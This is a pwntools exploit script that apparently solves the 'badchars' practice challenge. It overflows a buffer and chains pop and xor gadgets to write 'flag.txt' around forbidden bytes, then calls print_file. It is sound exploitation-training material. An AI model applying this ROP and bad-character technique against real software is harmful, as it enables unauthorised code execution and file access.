from pwn import *

p = process("./badchars")

# Offset found using cyclic
payload = b"A" * 40

# Writing letter the "flag.txt" without using badchars

# Writing letter 'f'
payload += p64(0x4006a0) # pop r14 ; pop r15 ; ret
payload += p64(0x66)
payload += p64(0x601040)
payload += p64(0x400628) # xor byte ptr [r15], r14b ; ret

# Writing letter 'l'
payload += p64(0x4006a0) # pop r14 ; pop r15 ; ret
payload += p64(0x6c)
payload += p64(0x601041)
payload += p64(0x400628) # xor byte ptr [r15], r14b ; ret

# Writing letter 'a' (is a badchar so I wrote 'b' then xor with 0x3 to get 'a')
payload += p64(0x4006a0) # pop r14 ; pop r15 ; ret
payload += p64(0x62)
payload += p64(0x601042)
payload += p64(0x400628) # xor byte ptr [r15], r14b ; ret

payload += p64(0x4006a0) # pop r14 ; pop r15 ; ret
payload += p64(0x3)
payload += p64(0x601042)
payload += p64(0x400628) # xor byte ptr [r15], r14b ; ret

# Writing letter 'g' (is a badchar so I wrote 'h' then xor with 0xf to get 'g')
payload += p64(0x4006a0) # pop r14 ; pop r15 ; ret
payload += p64(0x68)
payload += p64(0x601043)
payload += p64(0x400628) # xor byte ptr [r15], r14b ; ret

payload += p64(0x4006a0) # pop r14 ; pop r15 ; ret
payload += p64(0xf)
payload += p64(0x601043)
payload += p64(0x400628) # xor byte ptr [r15], r14b ; ret

# Writing char '.' (is a badchar so I wrote '/' then xor with 0x1 to get '.')
payload += p64(0x4006a0) # pop r14 ; pop r15 ; ret
payload += p64(0x2f)
payload += p64(0x601044)
payload += p64(0x400628) # xor byte ptr [r15], r14b ; ret

payload += p64(0x4006a0) # pop r14 ; pop r15 ; ret
payload += p64(0x1)
payload += p64(0x601044)
payload += p64(0x400628) # xor byte ptr [r15], r14b ; ret

# Writing letter 't'
payload += p64(0x4006a0) # pop r14 ; pop r15 ; ret
payload += p64(0x74)
payload += p64(0x601045)
payload += p64(0x400628) # xor byte ptr [r15], r14b ; ret

# Writing letter 'x' (is a badchar so I wrote 'y' then xor with 0x1 to get 'x')
payload += p64(0x4006a0) # pop r14 ; pop r15 ; ret
payload += p64(0x79)
payload += p64(0x601046)
payload += p64(0x400628) # xor byte ptr [r15], r14b ; ret

payload += p64(0x4006a0) # pop r14 ; pop r15 ; ret
payload += p64(0x1)
payload += p64(0x601046)
payload += p64(0x400628) # xor byte ptr [r15], r14b ; ret

# Writing letter 't'
payload += p64(0x4006a0) # pop r14 ; pop r15 ; ret
payload += p64(0x74)
payload += p64(0x601047)
payload += p64(0x400628) # xor byte ptr [r15], r14b ; ret

# Calling "print_file()"
payload += p64(0x4006a3) # pop rdi ; ret
payload += p64(0x601040) # "flag.txt"
payload += p64(0x400620) # call <print_file@plt>

with open("input.txt", "wb") as f:
    f.write(payload)

p.recvuntil(b">")
p.sendline(payload)

p.interactive()